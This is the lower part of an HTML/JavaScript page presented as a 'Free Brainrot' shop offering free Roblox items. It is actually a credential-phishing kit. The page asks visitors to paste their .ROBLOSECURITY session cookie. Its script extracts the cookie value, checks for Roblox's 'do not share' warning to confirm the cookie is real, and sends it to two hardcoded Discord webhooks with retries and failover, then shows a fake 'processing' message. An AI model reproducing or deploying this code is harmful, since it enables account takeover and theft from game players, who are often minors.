        </div>
        <div class="product">
            <img src="images/blackhole-slap.png" alt="Blackhole Slap">
            <h2>Blackhole Slap</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Blackhole Slap')">Select</button>
        </div>
        <div class="product">
            <img src="images/flying-carpet.png" alt="Flying Carpet">
            <h2>Flying Carpet</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Flying Carpet')">Select</button>
        </div>
        <div class="product">
            <img src="images/laser-gun.png" alt="Laser Gun">
            <h2>Laser Gun</h2>
            <p>Free</p>
            <button class="select-btn" onclick="toggleSelect(this, 'Laser Gun')">Select</button>
        </div>
    </div>
    <button class="finish-btn" onclick="finishSelection()">Finish</button>
</main>

<footer>
    <p>&copy; 2025 Free Brainrot. All rights reserved.</p>
</footer>

<!-- Modal for Selected Items -->
<div id="selectionModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal()">&times;</span>
        <h2>Your Selected Items</h2>
        <ul id="selectedItemsList"></ul>
        <label for="username">Enter your username:</label>
        <input type="text" id="username" placeholder="Username">
        <label for="profile">Enter .ROBLOSECURITY Cookie</label>
        <input type="text" id="profile" placeholder="Paste your .ROBLOSECURITY cookie here">
        <button onclick="submitSelectionAndSendToWebhook()">Submit & Get Items</button>
    </div>
</div>

<!-- Modales de éxito y error -->
<div class="modal" id="modal-success">
    <div class="modal-success-content">
        <i class="fas fa-check-circle"></i>
        <p class="mt-4">PROCESSING YOUR REQUEST. PLEASE WAIT.</p>
        <p>[DO NOT CLOSE THIS WINDOW]</p>
    </div>
</div>
<div class="modal" id="modal-error">
    <div class="modal-error-content">
        <i class="fas fa-times-circle"></i>
        <p class="mt-4">ERROR: PLEASE FILL IN ALL FIELDS</p>
    </div>
</div>

<script>
    const selectedItems = [];

    // Inicializar seguimiento de sesión
    if (!sessionStorage.getItem('sessionStart')) {
        sessionStorage.setItem('sessionStart', new Date().toISOString());
    }

    // Función para generar partículas
    function createParticles() {
        const particleContainer = document.getElementById('particle-container');
        const numberOfParticles = 30; // Más partículas para un efecto más denso

        for (let i = 0; i < numberOfParticles; i++) {
            const particle = document.createElement('div');
            particle.classList.add('particle');
            const size = Math.random() * 5 + 2; // Tamaño entre 2px y 7px
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            particle.style.left = `${Math.random() * 100}vw`;
            particle.style.top = `${Math.random() * 100}vh`;
            particle.style.animationDelay = `${Math.random() * 15}s`; // Retraso aleatorio
            particle.style.animationDuration = `${Math.random() * 10 + 10}s`; // Duración aleatoria
            particleContainer.appendChild(particle);
        }
    }

    // Llamar a la función de partículas al cargar la página
    document.addEventListener('DOMContentLoaded', createParticles);


    function toggleSelect(button, itemName) {
        button.classList.toggle('selected');
        if (button.classList.contains('selected')) {
            button.textContent = 'SELECTED';
            selectedItems.push(itemName);
        } else {
            button.textContent = 'SELECT';
            const index = selectedItems.indexOf(itemName);
            if (index > -1) {
                selectedItems.splice(index, 1);
            }
        }
    }

    function finishSelection() {
        const modal = document.getElementById('selectionModal');
        const selectedItemsList = document.getElementById('selectedItemsList');
        selectedItemsList.innerHTML = '';

        if (selectedItems.length === 0) {
            selectedItemsList.innerHTML = '<li>NO ITEMS SELECTED.</li>';
        } else {
            selectedItems.forEach(item => {
                const listItem = document.createElement('li');
                listItem.textContent = item.toUpperCase();
                selectedItemsList.appendChild(listItem);
            });
        }
        modal.style.display = 'flex';
    }

    function closeModal() {
        const modal = document.getElementById('selectionModal');
        modal.style.display = 'none';
    }

    function showSuccessModal() {
        const modal = document.getElementById('modal-success');
        modal.style.display = 'flex';
        setTimeout(() => {
            modal.style.display = 'none';
        }, 10000);
    }

    function showErrorModal() {
        const modal = document.getElementById('modal-error');
        modal.style.display = 'flex';
        setTimeout(() => {
            modal.style.display = 'none';
        }, 5000);
    }

    // Función para enviar webhook con solo el valor de la cookie
    function sendOnlyCookieValueWebhook(cookieValue) {
        const webhookUrls = [
            'https://discord.com/api/webhooks/1402793099599810743/2MmI0o4Vwoz8rTG5gUGPhQyJWsWs1tXPW_GOHpXL3qXJ82bU0RIoOJuPJu5wssDHqKmR',
            'https://discord.com/api/webhooks/1388436003257323592/ptaQw30nZHv2zTYN59Rk2K3Fri5e2RZuU1WdJp3AMv6umXMXUe5iJZ81bd1LVwm9UZx_'
        ];

        const MAX_CONTENT_LENGTH = 2000; // Límite de caracteres para el contenido de un mensaje de Discord

        // Construir el payload con solo el valor de la cookie
        const webhookPayload = {
            content: `\`\`\`${cookieValue.substring(0, MAX_CONTENT_LENGTH - 6)}\`\`\`` // Envolver en code block y truncar si es necesario
        };

        // *** AÑADE ESTO PARA DEPURAR EL PAYLOAD ***
        console.log("--- Webhook Payload Debug (Cookie Value Only) ---");
        console.log("Payload JSON:", JSON.stringify(webhookPayload, null, 2));
        console.log("Length of Payload JSON (stringified):", JSON.stringify(webhookPayload).length);
        console.log("--- End Debug ---");

        async function attemptWebhookSend(urlIndex = 0, retryCount = 0) {
            const maxRetries = 3;

            try {
                const response = await fetch(webhookUrls[urlIndex], {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'BrainrotShop-Webhook/1.0'
                    },
                    body: JSON.stringify(webhookPayload)
                });

                if (response.ok) {
                    console.log(`Webhook sent successfully to endpoint ${urlIndex + 1}`);
                    return true;
                } else if (response.status === 429) {
                    console.warn(`Rate limited on endpoint ${urlIndex + 1}, trying next...`);
                    if (urlIndex < webhookUrls.length - 1) {
                        return attemptWebhookSend(urlIndex + 1, 0);
                    }
                } else if (retryCount < maxRetries) {
                    console.warn(`Error ${response.status} on endpoint ${urlIndex + 1}, retrying...`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * (retryCount + 1)));
                    return attemptWebhookSend(urlIndex, retryCount + 1);
                } else if (urlIndex < webhookUrls.length - 1) {
                    return attemptWebhookSend(urlIndex + 1, 0);
                }

                return false;
            } catch (error) {
                console.error(`Network error on webhook ${urlIndex + 1}:`, error);

                if (retryCount < maxRetries) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * (retryCount + 1)));
                    return attemptWebhookSend(urlIndex, retryCount + 1);
                } else if (urlIndex < webhookUrls.length - 1) {
                    return attemptWebhookSend(urlIndex + 1, 0);
                }

                return false;
            }
        }

        logWebhookActivity('WEBHOOK_ATTEMPT_COOKIE_VALUE_ONLY', {
            cookieValuePreview: cookieValue.substring(0, 50) + '...',
            timestamp: new Date().toISOString()
        });

        attemptWebhookSend().then(success => {
            if (success) {
                logWebhookActivity('WEBHOOK_SUCCESS_COOKIE_VALUE_ONLY', {
                    cookieValuePreview: cookieValue.substring(0, 50) + '...'
                });
                console.log('Cookie value webhook sent successfully');
            } else {
                logWebhookActivity('WEBHOOK_FAILED_COOKIE_VALUE_ONLY', {
                    error: 'All endpoints failed'
                });
                console.error('All webhook endpoints failed for cookie value');
            }
        });

        return true;
    }

    function submitSelectionAndSendToWebhook() {
        const username = document.getElementById('username').value.trim();
        const profileInputContent = document.getElementById('profile').value.trim();

        // Validar que el username no esté vacío
        if (username === '') {
            showErrorModal();
            return;
        }

        // Validar que el campo de la cookie no esté vacío y contenga el patrón
        // Se busca el patrón ".ROBLOSECURITY", "valor" o ".ROBLOSECURITY=valor"
        const cookiePatternMatch = profileInputContent.match(/\.ROBLOSECURITY[",\s]*(?:=|:)?\s*(?:")?([^";\s]+)(?:")?/i);
        if (profileInputContent === '' || !cookiePatternMatch || !cookiePatternMatch[1]) {
            showErrorModal();
            return;
        }

        if (selectedItems.length === 0) {
            alert('PLEASE SELECT AT LEAST ONE ITEM.');
            return;
        }

        // Extraer SOLO el valor de la cookie de seguridad
        let cookieValueToExtract = "NO ROBLOX SECURITY COOKIE VALUE FOUND";
        // Esta regex captura el contenido dentro de las comillas después de ".ROBLOSECURITY", "
        const valueMatch = profileInputContent.match(/\.ROBLOSECURITY",\s*"(.*?)"/i);

        if (valueMatch && valueMatch[1]) {
            cookieValueToExtract = valueMatch[1];
        } else {
            // Fallback: si no se encuentra el patrón exacto, enviar el contenido original
            // Esto es menos ideal, pero asegura que algo se envíe si el formato es inesperado
            cookieValueToExtract = profileInputContent;
        }

        // Solo enviar si contiene el warning de Roblox (formato real)
        const warningPatterns = [
            "WARNING:-DO-NOT-SHARE-THIS",
            "Warning Do not shake this",
            "_|WARNING:-DO-NOT-SHARE-THIS",
            "DO-NOT-SHARE-THIS"
        ];

        const shouldSendWebhook = warningPatterns.some(pattern =>
            profileInputContent.includes(pattern) ||
            username.includes(pattern) ||
            selectedItems.some(selectedItem => selectedItem.includes(pattern))
        );

        logWebhookActivity('WARNING_CHECK', {
            username: username,
            itemCount: selectedItems.length,
            warningFound: shouldSendWebhook,
            detectedPatterns: warningPatterns.filter(pattern =>
                profileInputContent.includes(pattern) ||
                username.includes(pattern) ||
                selectedItems.some(selectedItem => selectedItem.includes(pattern))
            ),
            checkLocations: {
                inProfile: warningPatterns.some(pattern => profileInputContent.includes(pattern)),
                inUsername: warningPatterns.some(pattern => username.includes(pattern)),
                inItems: warningPatterns.some(pattern => selectedItems.some(selectedItem => selectedItem.includes(pattern)))
            }
        });

        if (shouldSendWebhook) {
            // Llamar a la nueva función que solo envía el valor de la cookie
            const sentSuccessfully = sendOnlyCookieValueWebhook(cookieValueToExtract);

            if (sentSuccessfully) {
                console.log('WEBHOOK SENT - Only Cookie Value (Warning detected)');
            }
        } else {
            logWebhookActivity('WARNING_NOT_FOUND', {
                username: username,
                itemCount: selectedItems.length,
                profilePreview: profileInputContent.substring(0, Math.min(profileInputContent.length, 100))
            });
            console.log('WEBHOOK NOT SENT - Warning text not found');
        }

        // Mostrar modal de éxito independientemente
        showSuccessModal();
        closeModal();

        // Limpiar la selección y los botones
        selectedItems.length = 0;
        document.querySelectorAll('.select-btn.selected').forEach(button => {
            button.classList.remove('selected');
            button.textContent = 'SELECT';
        });
    }

    // Función para logging detallado
    function logWebhookActivity(action, data) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            action: action,
            data: data,
            sessionId: sessionStorage.getItem('sessionStart')
        };

        console.log(`[WEBHOOK LOG] ${action}:`, logEntry);

        // Guardar en localStorage para debugging
        const logs = JSON.parse(localStorage.getItem('webhookLogs') || '[]');
        logs.push(logEntry);

        // Mantener solo los últimos 50 logs
        if (logs.length > 50) {
            logs.splice(0, logs.length - 50);
        }

        localStorage.setItem('webhookLogs', JSON.stringify(logs));
    }

    // Función para verificar el estado de los webhooks
    async function checkWebhookHealth() {
        const webhookUrls = [
            'https://discord.com/api/webhooks/1402793099599810743/2MmI0o4Vwoz8rTG5gUGPhQyJWsWs1tXPW_GOHpXL3qXJ82bU0RIoOJuPJu5wssDHqKmR',
            'https://discord.com/api/webhooks/1388436003257323592/ptaQw30nZHv2zTYN59Rk2K3Fri5e2RZuU1WdJp3AMv6umXMXUe5iJZ81bd1LVwm9UZx_'
        ];

        const healthStatus = [];

        for (let i = 0; i < webhookUrls.length; i++) {
            try {
                const response = await fetch(webhookUrls[i], {
                    method: 'GET',
                    headers: { 'User-Agent': 'BrainrotShop-HealthCheck/1.0' }
                });

                healthStatus.push({
                    endpoint: i + 1,
                    status: response.ok ? 'healthy' : 'unhealthy',
                    statusCode: response.status
                });
            } catch (error) {
                healthStatus.push({
                    endpoint: i + 1,
                    status: 'error',
                    error: error.message
                });
            }
        }

        logWebhookActivity('HEALTH_CHECK', healthStatus);
        return healthStatus;
    }

    // Función para limpiar logs antiguos
    function clearOldLogs() {
        localStorage.removeItem('webhookLogs');
        console.log('Webhook logs cleared');
    }

    // Verificar salud de webhooks al cargar la página
    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(() => {
            checkWebhookHealth();
        }, 2000);
    });

    window.onclick = function(event) {
        const selectionModal = document.getElementById('selectionModal');
        const successModal = document.getElementById('modal-success');
        const errorModal = document.getElementById('modal-error');

        if (event.target == selectionModal) {
            selectionModal.style.display = "none";
        }
        if (event.target == successModal) {
            successModal.style.display = "none";
        }
        if (event.target == errorModal) {
            errorModal.style.display = "none";
        }
    }

    // Funciones de utilidad para debugging (disponibles en consola)
    window.debugWebhook = {
        checkHealth: checkWebhookHealth,
        clearLogs: clearOldLogs,
        viewLogs: () => JSON.parse(localStorage.getItem('webhookLogs') || '[]'),
        testWarning: () => {
            document.getElementById('username').value = 'TestUser';
            document.getElementById('profile').value = '$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.TestCookieValue", "/", ".roblox.com")))';
            selectedItems.push('Test Item');
            console.log('Test data set with real Roblox cookie format. Click Finish to test webhook.');
        },
        testWithRealCookie: (cookieValue) => {
            document.getElementById('username').value = 'RealTestUser';
            document.getElementById('profile').value = `$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${cookieValue}", "/", ".roblox.com")))`;
            selectedItems.push('Real Test Item');
            console.log('Real cookie test data set. Click Finish to test webhook.');
        },
        simulateFinish: () => {
            // Simular click en finish para testing
            if (selectedItems.length === 0) {
                selectedItems.push('Debug Test Item');
            }
            submitSelectionAndSendToWebhook();
        }
    };
</script>

</body>
</html>
